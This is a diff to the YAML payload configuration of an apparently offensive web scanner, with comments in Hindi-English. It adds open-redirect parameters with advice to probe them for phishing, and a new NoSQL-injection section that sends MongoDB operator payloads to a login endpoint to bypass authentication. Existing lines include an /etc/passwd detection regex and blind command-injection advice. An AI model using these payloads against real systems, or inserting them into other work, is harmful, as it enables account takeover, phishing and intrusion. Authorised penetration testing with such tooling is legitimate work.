@@ -19,7 +19,7 @@ lfi:
   signals:
     - {type: regex, pattern: 'root:x:0:0|daemon:x:|\[fonts\]|PD9waHA'}
 open_redirect:
-  params: [url, redirect, next, return, target, callback, dest, to]
+  params: [url, redirect, next, return, target, callback, dest, to, ref, returnUrl, callback_url]
   advice: 'OAuth/SSO flow mein is param ko phishing ke liye test karein'
   payloads: ["https://example.com/dorklens", "//example.com/dorklens"]
   signals:
@@ -49,6 +49,19 @@ nosqli:
   payloads: ['{"$ne":null}', "[$ne]=1", "' || '1'=='1"]
   signals:
     - {type: length_delta, pct: 25}
+nosqli_json:
+  method: POST
+  paths: [/rest/user/login]
+  content_type: application/json
+  body: '{"email":{{INJECT}},"password":"x"}'
+  baseline: '"probe@test.local"'
+  params: [email, user, username]
+  advice: 'POST JSON ko curl ya browser devtools se confirm karein; auth bypass ho sakta hai'
+  payloads: ['{"$ne":null}', '{"$gt":""}', '{"$regex":".*"}']
+  signals:
+    - {type: regex, pattern: 'authentication|token|admin@|Invalid password|SyntaxError|Mongo'}
+    - {type: length_delta, pct: 20}
+    - {type: status_change}
 cmd_inject:
   params: [id, cmd, host, ip, ping, domain]
   advice: 'blind case mein `sleep 5` ya out-of-band DNS use karein'
